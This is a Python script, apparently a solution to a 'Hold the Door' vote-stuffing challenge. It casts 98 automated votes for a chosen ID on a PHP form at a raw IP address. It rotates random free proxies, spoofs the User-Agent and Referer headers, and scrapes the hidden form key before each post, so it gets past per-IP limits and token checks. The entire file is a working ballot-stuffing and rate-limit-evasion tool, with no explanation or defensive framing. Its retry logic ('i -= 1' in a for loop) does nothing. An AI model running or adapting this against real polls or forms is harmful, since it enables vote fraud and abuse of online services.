#!/usr/bin/python3
from bs4 import BeautifulSoup
import requests
from fp.fp import FreeProxy
url = 'http://158.69.76.135/level4.php'
ID = int(input("ID: "))
votes = 0
error = 0
times = 98
b = 0
# ua = UserAgent SO Windows
ua = 'Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/\
537.36 (KHTML, like Gecko) Chrome/29.0.1547.2 Safari/537.36'
header = {'User-Agent': ua, 'Referer': url}
print("Loading...\n")
for i in range(0, times):
    flag = 0
    print("=============N° " + str(i) + "=============")
    try:
        proxy = FreeProxy(country_id=['US', 'CA', 'FR', '\
        MX', 'IR'], rand=True).get()
        print("proxy inicial -> {}".format(proxy))
        if b == 0:
            proxy = proxy.split(':')
            proxy = str(proxy[0]) + ':' + str(proxy[1])
            print("proxi fraccionada -> {}".format(proxy))
        proxy = {"http": proxy}
        print("Envío -> {}".format(proxy))
        flag = 1
        b = 1
    except Exception as err:
        i -= 1
        b = 0
        print("Erroraaa: ", err)
    if flag == 1:
        try:
            enter = requests.Session()
            enter.headers.update(header)

            txt = enter.get(url, headers=header, proxies=proxy)
            soup = BeautifulSoup(txt.text, 'html.parser')
            code = soup.select('form > input[name="key"]')[0].get('value')
            check = {'id': ID, 'holdthedoor': 'submit', 'key': code}
            resp = enter.post(url, headers=header, data=check, proxies=proxy)
            if resp.status_code == 200:
                votes += 1
            print("URL->{}".format(url))
            print("Data inserted->\n{}".format(check))
            b = 0
        except Exception as erro:
            error += 1
            i -= 1
            b = 1
            print("Erroreee: ", erro)

percent = round(votes * 100 / times, 2)
print("--/\\/\\Scraping_Test/\\/\\--")
print("Success Cases: {}".format(votes))
print("Error Cases: {}".format(error))
print("{}% of the operation was successful\n".format(percent))
